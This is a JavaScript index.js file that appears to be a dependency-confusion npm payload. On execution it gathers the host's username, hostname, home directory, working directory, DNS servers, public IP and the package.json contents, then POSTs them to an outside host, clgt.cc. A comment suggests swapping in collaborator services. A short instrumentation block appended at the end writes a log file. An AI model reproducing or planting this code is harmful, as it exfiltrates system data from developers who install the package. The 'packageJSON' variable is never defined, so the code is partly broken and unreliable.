
// === Begin index.js ===
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");

const package = packageJSON.name;

const sleep = (milliseconds) => {                                                                                                                                                         
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

function requestPromise(endpoint) {
    var body = ''

    return new Promise(function(resolve, reject){
        https.get((endpoint), res => {
            res.setEncoding('utf8');
            res.on("data", data => {
                body += data;
            });
            res.on("end", () => {
                resolve(body)
            });
            res.on("error", (e) => {
                reject(e);
            });
        });
    });
    
}

async function main() {

    const url = 'https://ifconfig.me'
    const ip = await requestPromise(url)

    const trackingData = JSON.stringify({
        p: package,
        c: __dirname,
        current_pwd: process.cwd(),
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: dns.getServers(),
        r: packageJSON ? packageJSON.___resolved : undefined,
        v: packageJSON.version,
        pjson: packageJSON,
        ip: ip
    });


    var postData = querystring.stringify({
        msg: trackingData,
    });

    var options = {
        hostname: "clgt.cc", //replace burpcollaborator.net with Interactsh or pipedream
        port: 443,
        path: "/dependency-conf-npm.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
        },
    };

    var req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        // console.error(e);
    });

    req.write(postData);
    req.end();
} main()

// === End index.js ===

// === Auto Appended Behavior Injection ===
try {
  const fs = require('fs');
  fs.writeFileSync('dynamic_log.txt', 'Triggered dynamic API');
  console.log('[Dynamic] fs.writeFileSync called');
} catch (e) {
  console.error('[Dynamic] Injection failed:', e);
}
